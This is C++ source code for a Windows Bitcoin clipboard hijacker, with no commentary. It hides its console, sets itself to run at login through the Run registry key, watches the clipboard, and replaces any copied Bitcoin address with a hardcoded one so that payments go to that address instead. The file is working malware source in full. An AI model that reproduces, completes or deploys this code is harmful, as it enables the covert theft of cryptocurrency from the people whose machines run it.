#include <Windows.h>
#include <iostream>
#include <regex>
#include <cstring>
#include <filesystem>
using namespace std;

#define btc "1BoatSLRHtKNngkdXEeobR76b53LETtpyT"
#define size strlen(btc) + 1

void persistence() {
    HKEY hkey = NULL;
    DWORD type, datasize;

    std::filesystem::path p = std::filesystem::current_path();
    std::filesystem::path fullpath = p / "btc_clipper.exe";
    std::string ansi_path = fullpath.string();

    LPCTSTR subkey = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
    LPCTSTR valuename = TEXT("btc");

    if (RegOpenKeyEx(HKEY_CURRENT_USER, subkey, 0, KEY_WRITE, &hkey) == ERROR_SUCCESS) {
        RegSetValueExA(hkey, valuename, 0, REG_SZ, reinterpret_cast<const BYTE*>(ansi_path.c_str()), ansi_path.length() + 1);
        RegCloseKey(hkey);
    }
    else{
        cout<<"Failed to open key";
    }

    std::cout << ansi_path << std::endl;
}


string GetClipboard() {
    OpenClipboard(NULL);
    HANDLE hclip = GetClipboardData(CF_TEXT);
    if (hclip == NULL) {
        CloseClipboard();
        return "";
    }
    LPVOID pclip = GlobalLock(hclip);
    const char* clipboardText = static_cast<const char*>(pclip);
    cout << "Clipboard text = " << clipboardText << endl;
    GlobalUnlock(hclip);
    CloseClipboard();
    if (clipboardText != "" && clipboardText != NULL) {
        return string(clipboardText);
    } else {
        return "";
    }
}

void SetClipboard() {
 
    HGLOBAL handle_mem = GlobalAlloc(GMEM_MOVEABLE, size);
    LPVOID clipData = GlobalLock(handle_mem);
    memcpy(clipData, btc, size);
    GlobalUnlock(handle_mem);
    OpenClipboard(NULL);
    EmptyClipboard();
    SetClipboardData(CF_TEXT, handle_mem);
    CloseClipboard();
}

bool IsWallet(string data) {
    regex walletCheck("^(1|3|bc1)[A-Za-z0-9]{23,59}$");
    return regex_match(data, walletCheck);
}

LRESULT CALLBACK ClipboardFormatListenerProc(HWND hwnd, UINT imsg, WPARAM wParam, LPARAM lParam) {
    if (imsg == WM_CLIPBOARDUPDATE) {
        cout << "Clipboard Update Detected!" << endl;
        string clipdata = GetClipboard();
        if (IsWallet(clipdata) && clipdata != btc){
            cout << "Clipboard contains a wallet address. Modifying clipboard..." << endl;
            SetClipboard();
        }
    }

    return DefWindowProcW(hwnd, imsg, wParam, lParam); 
}

int main() {
    FreeConsole();
    persistence();
    WNDCLASSW wc = {0}; 
    wc.lpfnWndProc = ClipboardFormatListenerProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = L"ClipboardListenerClass"; 

    if (!RegisterClassW(&wc)) { 
        cerr << "Error registering window class." << endl;
        return 1;
    }

    HWND hwnd = CreateWindowW(L"ClipboardListenerClass", L"Clipboard Monitor", 0,
                              0, 0, 0, 0,
                              NULL, NULL, GetModuleHandle(NULL), NULL);

    if (hwnd == NULL) {
        cerr << "Error creating window." << endl;
        return 1;
    }

    if (!AddClipboardFormatListener(hwnd)) {
        cerr << "Error adding clipboard format listener." << endl;
        DestroyWindow(hwnd);
        UnregisterClassW(L"ClipboardListenerClass", GetModuleHandle(NULL)); 
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) && msg.message != WM_QUIT) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    RemoveClipboardFormatListener(hwnd);
    DestroyWindow(hwnd);
    UnregisterClassW(L"ClipboardListenerClass", GetModuleHandle(NULL)); 

    return 0;
}
